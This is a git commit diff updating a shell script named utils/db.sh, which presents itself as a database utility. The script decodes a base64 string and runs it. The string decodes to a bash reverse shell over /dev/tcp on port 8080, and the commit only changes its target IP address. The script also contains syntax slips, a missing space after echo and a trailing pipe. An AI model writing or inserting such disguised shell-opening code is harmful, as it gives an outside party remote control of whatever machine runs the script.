77f3e01b9c1c2990b03a93faf369893d25edb1a8
likeyou <102893013+liKeyou567@users.noreply.github.com>
2026-06-29 14:13:54 +0800

    Update db.sh

--- moke1145149561/utils/db.sh
+++ moke1145149561/utils/db.sh
@@ -1,4 +1,4 @@
 #!/usr/bin/env bash
-encoded='YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xNy40MC4zNi84MDgwIDA+JjE='
+encoded='YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEzLjEyOC84MDgwIDA+JjE='
 decoded=$(echo"$encoded" | base64 -d)
 bash -c "$decoded"|
